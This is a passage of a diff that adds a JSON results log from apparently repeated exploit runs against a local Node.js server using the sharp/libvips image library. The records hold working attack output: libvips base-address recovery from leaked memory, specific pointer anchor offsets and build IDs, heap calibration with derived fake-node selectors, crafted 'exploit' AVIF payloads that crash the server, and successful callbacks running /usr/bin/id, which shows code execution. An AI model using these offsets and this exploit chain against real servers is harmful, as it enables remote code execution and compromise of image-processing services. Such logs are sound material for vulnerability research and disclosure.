+                          "0xd4818"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7ffb68029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6df40",
+                          "0x6df48",
+                          "0x6df50",
+                          "0x6df58",
+                          "0x6df60",
+                          "0x6df68",
+                          "0x6df70",
+                          "0x6df78"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7ffb8a865000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7ffb8aa231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6f110"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7ffb8aa28120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6f688",
+                          "0x6f720"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7ffb8a85f000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7ffb8aa22120",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6efb0",
+                          "0x6eff0",
+                          "0x6f048",
+                          "0x6f088"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 2
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 0,
+                "distinct_pointer_qwords": 0,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 3
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 0,
+                "distinct_pointer_qwords": 0,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 4
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7ffb89c00000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7ffb89dbe1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0xd400"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7ffb89dc3120",
+                "repetitions": 4,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x83a8",
+                  "0xd3f8",
+                  "0xf1a8",
+                  "0x10228"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7ffb89dc3130",
+                "repetitions": 4,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x83b8",
+                  "0xd408",
+                  "0xf1b8",
+                  "0x10238"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 4140,
+                "distinct_pointer_qwords": 1536,
+                "supported_bases": [
+                  {
+                    "base": "0x7ffb89c00000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7ffb89dbe1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd400"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7ffb89dc3120",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x83a8",
+                          "0xd3f8",
+                          "0xf1a8",
+                          "0x10228"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7ffb89dc3130",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x83b8",
+                          "0xd408",
+                          "0xf1b8",
+                          "0x10238"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7ffb67e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7ffb680241b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xf5700"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7ffb68029130",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xd74d8",
+                          "0xde760"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7ffb89c03000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7ffb89dc6120",
+                        "repetitions": 7,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xe7c8",
+                          "0x10c78",
+                          "0x112d8",
+                          "0x118c8",
+                          "0x16698",
+                          "0x184a8",
+                          "0x1efb8"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7ffb68319000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7ffb684dc130",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x17800",
+                          "0x17810"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 5
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5099,
+                "distinct_pointer_qwords": 1965,
+                "supported_bases": [],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7ffb8a865000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7ffb8aa231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6cd90"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7ffb8aa28120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x6d308",
+                          "0x6d3a0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7ffb6ff4c000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7ffb7010f120",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x75ab8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7ffb7010f130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xf52d0"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7ffb89c00000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7ffb89dc3120",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xfefa8"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7ffb89dc3130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xfefb8"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 6
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-fc51f511fb8a48fbb691a8999a6f6a11.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 8,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f9cfd400000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f9cfd400000",
+            "response_sha256": "2939194453259fc0911db605823048ad8fbacf16d3b0ba7890284b5718bf5524",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xe99c8",
+                "arena_base": "0x7f9ce4000000",
+                "arena_sentinel": "0x7f9ce4000098",
+                "related_pointer": "0x7f9ce455fd60",
+                "related_pointer_delta": "0x68f30",
+                "anchor": "0x7f9ce44f6e30",
+                "anchor_page": "0x7f9ce44f6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f9ce44f72f0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f9cfd73cd0f",
+                  "0x7f9cfd73de99",
+                  "0x7f9cfd5b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f9ce44f5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xef588",
+                "arena_base": "0x7f9ce4000000",
+                "arena_sentinel": "0x7f9ce4000098",
+                "related_pointer": "0x7f9ce455fd60",
+                "related_pointer_delta": "0x63370",
+                "anchor": "0x7f9ce44fc9f0",
+                "anchor_page": "0x7f9ce44fc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f9ce44fceb0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f9cfd73cd0f",
+                  "0x7f9cfd73de99",
+                  "0x7f9cfd5b8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f9ce44fb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 2,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 2,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f9cfd400000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f9cfd5be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x4500"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f9cfd5c3120",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x44f8",
+              "0x62a8",
+              "0x7328",
+              "0x16358"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f9cfd5c3130",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x4508",
+              "0x62b8",
+              "0x7338",
+              "0x16368"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "selected",
+            "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "selected_base": "0x7f9cfd400000",
+            "selected_anchors": [
+              {
+                "offset": "0x1be1b0",
+                "value": "0x7f9cfd5be1b0",
+                "repetitions": 1,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x4500"
+                ]
+              },
+              {
+                "offset": "0x1c3120",
+                "value": "0x7f9cfd5c3120",
+                "repetitions": 4,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x44f8",
+                  "0x62a8",
+                  "0x7328",
+                  "0x16358"
+                ]
+              },
+              {
+                "offset": "0x1c3130",
+                "value": "0x7f9cfd5c3130",
+                "repetitions": 4,
+                "minimum_repetitions": 1,
+                "positions": [
+                  "0x4508",
+                  "0x62b8",
+                  "0x7338",
+                  "0x16368"
+                ]
+              }
+            ],
+            "rejected_candidates": [],
+            "supported_pair_count": 1,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "supported",
+                "reason": "exact_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 5878,
+                "distinct_pointer_qwords": 2059,
+                "supported_bases": [
+                  {
+                    "base": "0x7f9cfd400000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f9cfd5be1b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x4500"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f9cfd5c3120",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x44f8",
+                          "0x62a8",
+                          "0x7328",
+                          "0x16358"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f9cfd5c3130",
+                        "repetitions": 4,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x4508",
+                          "0x62b8",
+                          "0x7338",
+                          "0x16368"
+                        ]
+                      }
+                    ]
+                  }
+                ],
+                "best_partial_bases": [
+                  {
+                    "base": "0x7f9ce3e66000",
+                    "anchors": [
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f9ce4029120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0xdfe50",
+                          "0xdfe58"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f9ce4029130",
+                        "repetitions": 11,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x79580",
+                          "0x79588",
+                          "0x79590",
+                          "0x79598",
+                          "0x795a0",
+                          "0x795a8",
+                          "0x795b0",
+                          "0x795b8"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f9cfe065000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f9cfe2231b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7a750"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3120",
+                        "value": "0x7f9cfe228120",
+                        "repetitions": 2,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x7acc8",
+                          "0x7ad60"
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "base": "0x7f9ce3e57000",
+                    "anchors": [
+                      {
+                        "offset": "0x1be1b0",
+                        "value": "0x7f9ce40151b0",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x8d68"
+                        ]
+                      },
+                      {
+                        "offset": "0x1c3130",
+                        "value": "0x7f9ce401a130",
+                        "repetitions": 1,
+                        "minimum_repetitions": 1,
+                        "positions": [
+                          "0x9388"
+                        ]
+                      }
+                    ]
+                  }
+                ]
+              }
+            ],
+            "attempt": 2
+          }
+        ]
+      },
+      "remote_library": "uploads/x.jpg",
+      "payload_name": "exploit-1ad4b1fdd01d4ae380e95bfc7c2f74bd.avif",
+      "trigger_error": "RemoteDisconnected('Remote end closed connection without response')",
+      "lifetime": 9,
+      "exploit_exit": 0,
+      "server_exit": -11
+    },
+    {
+      "target": "http://127.0.0.1:3215",
+      "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+      "success": true,
+      "callback": {
+        "peer": "127.0.0.1",
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      },
+      "libvips_base": "0x7f34f4c00000",
+      "heap_calibration": {
+        "derived_selector": "0x5970",
+        "minimum_observations": 1,
+        "observations": [
+          {
+            "status": "candidates",
+            "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+            "libvips_base": "0x7f34f4c00000",
+            "response_sha256": "39ed3c8ad5b46a9064f993121074965025b34efa3200d18dd779bab305adc65c",
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "match_count": 2,
+            "selected_anchor_rank": 0,
+            "matches": [
+              {
+                "response_offset": "0xe9a08",
+                "arena_base": "0x7f34e0000000",
+                "arena_sentinel": "0x7f34e0000098",
+                "related_pointer": "0x7f34e105fd40",
+                "related_pointer_delta": "0x68f50",
+                "anchor": "0x7f34e0ff6df0",
+                "anchor_page": "0x7f34e0ff6000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f34e0ff72b0",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f34f4f3cd0f",
+                  "0x7f34f4f3de99",
+                  "0x7f34f4db8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f34e0ff5970",
+                "derived_selector": "0x5970"
+              },
+              {
+                "response_offset": "0xef5c8",
+                "arena_base": "0x7f34e0000000",
+                "arena_sentinel": "0x7f34e0000098",
+                "related_pointer": "0x7f34e105fd40",
+                "related_pointer_delta": "0x63390",
+                "anchor": "0x7f34e0ffc9b0",
+                "anchor_page": "0x7f34e0ffc000",
+                "anchor_alignment": "0x1000",
+                "peer": "0x7f34e0ffce70",
+                "peer_delta": "0x4c0",
+                "libvips_references": [
+                  "0x7f34f4f3cd0f",
+                  "0x7f34f4f3de99",
+                  "0x7f34f4db8480"
+                ],
+                "record_marker": "0x5b5b5b5b00000000",
+                "fake_node_delta_from_anchor_page": "-0x690",
+                "derived_fake_node": "0x7f34e0ffb970",
+                "derived_selector": "0xb970"
+              }
+            ],
+            "candidate_selectors": [
+              "0x5970"
+            ],
+            "attempt": 5,
+            "classification_status": "selected"
+          }
+        ]
+      },
+      "classification": {
+        "selected_attempt": 5,
+        "selected_profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+        "selected_base": "0x7f34f4c00000",
+        "selected_anchors": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f34f4dbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x4500"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f34f4dc3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x44f8",
+              "0x62a8",
+              "0x7338"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f34f4dc3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x4508",
+              "0x62b8",
+              "0x7348"
+            ]
+          }
+        ],
+        "rejected_candidates": [],
+        "attempts": [
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 3,
+                "distinct_pointer_qwords": 1,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 1
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 0,
+                "distinct_pointer_qwords": 0,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 2
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
+                    "offset": "0x1be1b0",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3120",
+                    "minimum_repetitions": 1
+                  },
+                  {
+                    "offset": "0x1c3130",
+                    "minimum_repetitions": 1
+                  }
+                ],
+                "supporting_hints": {
+                  "declared": {
+                    "image_geometry": "128x8192"
+                  },
+                  "observed": {
+                    "content-type": "image/png"
+                  },
+                  "matches": {}
+                },
+                "status": "rejected",
+                "reason": "insufficient_anchor_consensus",
+                "alpha_bytes": 1048576,
+                "pointer_qword_occurrences": 0,
+                "distinct_pointer_qwords": 0,
+                "supported_bases": [],
+                "best_partial_bases": []
+              }
+            ],
+            "attempt": 3
+          },
+          {
+            "status": "no_match",
+            "selected_profile_id": null,
+            "selected_base": null,
+            "selected_anchors": [],
+            "rejected_candidates": [
+              "node-25.8.1-sharp-0.34.4-linux-x64"
+            ],
+            "supported_pair_count": 0,
+            "image": {
+              "width": 128,
+              "height": 8192,
+              "alpha_bytes": 1048576
+            },
+            "observed_hints": {
+              "content-type": "image/png"
+            },
+            "candidates": [
+              {
+                "profile_id": "node-25.8.1-sharp-0.34.4-linux-x64",
+                "libvips_version": "8.17.2",
+                "libvips_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+                "scan_start": 0,
+                "scan_end": 1048576,
+                "scan_step": 8,
+                "required_anchors": 3,
+                "declared_anchors": [
+                  {
